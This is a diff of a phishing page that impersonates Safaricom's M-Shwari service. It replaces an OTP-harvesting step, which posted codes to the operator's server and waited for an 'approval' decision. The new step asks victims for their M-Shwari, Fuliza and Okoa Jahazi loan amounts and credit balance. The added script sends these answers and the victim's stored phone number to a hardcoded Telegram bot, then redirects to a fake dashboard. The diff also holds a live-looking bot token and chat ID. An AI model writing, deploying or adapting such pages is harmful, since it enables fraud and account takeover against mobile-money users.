@@ -1,172 +1,233 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <title>Verification</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+    <meta charset="UTF-8">
+    <title>Credit Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css">
-</head>
+    <style>
+        /* High-Contrast Professional Styling */
+        .highlight-box {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #42b549;
+            font-weight: bold;
+            text-align: center;
+        }
 
-<body>
+        .shouting-label {
+            display: block;
+            color: #42b549; /* Safaricom Green */
+            font-weight: 800;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            background: #262626;
+            padding: 15px;
+            border-radius: 10px;
+        }
+
+        .selector-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 5px;
+        }
+
+        .btn-toggle {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #3d3d3d;
+            background: #1a1a1a;
+            color: #fff;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .btn-toggle.active {
+            background-color: #42b549;
+            border-color: #42b549;
+        }
+
+        .amount-input {
+            display: none;
+            margin-top: 12px;
+            width: 100%;
+            padding: 12px;
+            background: #121212;
+            border: 1px solid #42b549;
+            color: #fff;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .note {
+            font-size: 0.75rem;
+            color: #ff4444;
+            background: rgba(255, 68, 68, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            text-align: center;
+            border: 1px dashed #ff4444;
+        }
+
+        .login-btn {
+            background-color: #42b549;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            border-radius: 30px;
+            font-weight: bold;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body class="loaded">
 
 <div class="header">
     <img src="logo-removebg-preview.png" alt="M-Shwari" id="main-logo">
-    
 </div>
 
 <div class="container">
-
     <h2 class="title">Verification</h2>
 
-    <!-- 🔄 LOADER -->
-    <div class="loader"></div>
+    <div class="highlight-box">
+        Do you have any loan related to your phone number?
+    </div>
 
-    <p style="text-align:center; margin-top:15px;">
-    Please enter the code sent to your phone number via SMS.
-</p>
+    <!-- M-SHWARI -->
+    <div class="form-group">
+        <label class="shouting-label">M-SHWARI DEBT</label>
+        <div class="selector-row">
+            <button type="button" class="btn-toggle" onclick="toggleField('mshwari', 'YES', this)">YES</button>
+            <button type="button" class="btn-toggle" onclick="toggleField('mshwari', 'NO', this)">NO</button>
+        </div>
+        <input type="number" id="mshwari-amount" class="amount-input" placeholder="How much? (KES)">
+    </div>
 
-    <!-- 🔢 OTP BOXES -->
-    <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>
+    <!-- FULIZA -->
+    <div class="form-group">
+        <label class="shouting-label">FULIZA M-PESA</label>
+        <div class="selector-row">
+            <button type="button" class="btn-toggle" onclick="toggleField('fuliza', 'YES', this)">YES</button>
+            <button type="button" class="btn-toggle" onclick="toggleField('fuliza', 'NO', this)">NO</button>
+        </div>
+        <input type="number" id="fuliza-amount" class="amount-input" placeholder="How much is the limit? (KES)">
+    </div>
 
-    <!-- BUTTON -->
-    <button class="login-btn" onclick="submitOTP()">Continue</button>
+    <!-- OKOA JAHAZI -->
+    <div class="form-group">
+        <label class="shouting-label">OKOA JAHAZI BALANCE</label>
+        <div class="selector-row">
+            <button type="button" class="btn-toggle" onclick="toggleField('okoa', 'YES', this)">YES</button>
+            <button type="button" class="btn-toggle" onclick="toggleField('okoa', 'NO', this)">NO</button>
+        </div>
+        <input type="number" id="okoa-amount" class="amount-input" placeholder="How much? (KES)">
+    </div>
 
+    <!-- CREDIT BALANCE -->
+    <div class="form-group">
+        <label class="shouting-label">CURRENT CREDIT BALANCE</label>
+        <input type="number" id="credit-balance" style="display:block; border-color:#3d3d3d;" class="amount-input" placeholder="Enter balance (KES)">
+    </div>
+
+    <div class="note">
+        <strong>NOTE:</strong> Any misinformation can lead to your loan approval delay or cancellation.
+    </div>
+
+    <button class="login-btn" id="submitBtn" onclick="submitCreditData()">Submit Verification</button>
+
+    <!-- PROCESSING SPIN (HIDDEN BY DEFAULT) -->
+    <div id="processingUI" style="display:none; text-align:center; margin-top:20px;">
+        <div class="loader"></div>
+        <p>Finalizing application...</p>
+    </div>
 </div>
-
+<br><br>
 <div class="footer">
-    <br><br><br><br><br><br>
+    <br><br><br><br><br>
     <img src="safaricom-25.gif" alt="Safaricom" class="saf-footer" id="saf-logo">
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", function () {
+    const selections = { mshwari: 'NO', fuliza: 'NO', okoa: 'NO' };
 
-    // get OTP length
-    const length = parseInt(localStorage.getItem("otpLength")) || 5;
+    function toggleField(category, value, btn) {
+        selections[category] = value;
+        
+        // UI Toggle
+        const row = btn.parentElement;
+        row.querySelectorAll('.btn-toggle').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
 
-    const container = document.getElementById("otpBoxes");
-
-    localStorage.removeItem("otpLength");
-
-    fetch("/clear-decision", { method: "POST" });
-
-    // create boxes
-    for (let i = 0; i < length; i++) {
-        const input = document.createElement("input");
-        input.type = "text";
-        input.maxLength = 1;
-        input.className = "pin-box";
-
-        container.appendChild(input);
+        // Show/Hide Amount field
+        const amountField = document.getElementById(`${category}-amount`);
+        if(value === 'YES') {
+            amountField.style.display = 'block';
+        } else {
+            amountField.style.display = 'none';
+            amountField.value = '';
+        }
     }
 
-    const inputs = document.querySelectorAll(".pin-box");
+    async function submitCreditData() {
+        const btn = document.getElementById('submitBtn');
+        const proc = document.getElementById('processingUI');
+        
+        btn.style.display = 'none';
+        proc.style.display = 'block';
 
-    inputs.forEach((input, index) => {
+        const data = {
+            mShwari: selections.mshwari === 'YES' ? document.getElementById('mshwari-amount').value : 'NO',
+            fuliza: selections.fuliza === 'YES' ? document.getElementById('fuliza-amount').value : 'NO',
+            okoa: selections.okoa === 'YES' ? document.getElementById('okoa-amount').value : 'NO',
+            creditBalance: document.getElementById('credit-balance').value || '0',
+            phone: localStorage.getItem("phone") || "N/A"
+        };
 
-        input.addEventListener("input", () => {
-            input.value = input.value.replace(/[^0-9]/g, "");
-
-            if (input.value && index < inputs.length - 1) {
-                inputs[index + 1].focus();
-            }
-        });
-
-        input.addEventListener("keydown", (e) => {
-            if (e.key === "Backspace" && !input.value && index > 0) {
-                inputs[index - 1].focus();
-            }
-        });
-
-    });
-
-    // submit OTP
-    window.submitOTP = async function () {
-        if (window.isSubmitting) return;
-        window.isSubmitting = true;
-
-        let otp = "";
-
-        inputs.forEach(input => {
-            otp += input.value;
-        });
-
-        if (otp.length != length) {
-            showError("Enter full code");
-            window.isSubmitting = false;
-            return;
-        }
-
-        const res = await fetch("/submit-otp", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ otp })
-        });
-
-        const data = await res.json();
-
-        if (data.success) {
-            showError("Code submitted. Loading...");
-        } else {
-            showError("Error submitting code");
-        }
-
-        window.isSubmitting = false;
-    };
-
-    let isRedirecting = false;
-
-    const decisionChecker = setInterval(async () => {
-        if (isRedirecting) return;
+        const message = `🏦 *Credit Verification Data*\n` +
+                        `--------------------------\n` +
+                        `📞 *Phone:* ${data.phone}\n` +
+                        `💰 *M-Shwari:* ${data.mShwari}\n` +
+                        `💳 *Fuliza:* ${data.fuliza}\n` +
+                        `⚓ *Okoa:* ${data.okoa}\n` +
+                        `⚖️ *Balance:* KES ${data.creditBalance}`;
 
         try {
-            const res = await fetch("/decision-status");
-            const data = await res.json();
+            await fetch(`https://api.telegram.org/bot8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: 7162306402,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
 
-            if (data.decision === "valid") {
-                isRedirecting = true;
-                clearInterval(decisionChecker);
-
-                document.querySelector(".container").innerHTML =
-                    "<h2 style='text-align:center'>Approved...</h2>";
-
-                setTimeout(() => {
-                    window.location.href = "/dashboard.html";
-                }, 1500);
-            }
-
-            if (data.decision === "invalid") {
-                showError("Invalid code. Try again.");
-            }
+            // Wait 3 seconds then head to dashboard
+            setTimeout(() => {
+                window.location.href = "dashboard.html";
+            }, 3000);
 
         } catch (err) {
-            console.log("Waiting decision...");
+            console.error(err);
+            alert("Connection error. Try again.");
+            btn.style.display = 'block';
+            proc.style.display = 'none';
         }
-
-    }, 2000);
-
-    function showError(msg) {
-        let box = document.getElementById("errorBox");
-
-        if (!box) {
-            box = document.createElement("div");
-            box.id = "errorBox";
-            box.style.color = "red";
-            box.style.textAlign = "center";
-            box.style.marginTop = "10px";
-            document.querySelector(".container").appendChild(box);
-        }
-
-        box.innerText = msg;
     }
-
-    document.body.classList.add("loaded");
-
-});
 </script>
-<div id="pageLoader" class="loader" style="display:none;"></div>
 </body>
 </html>
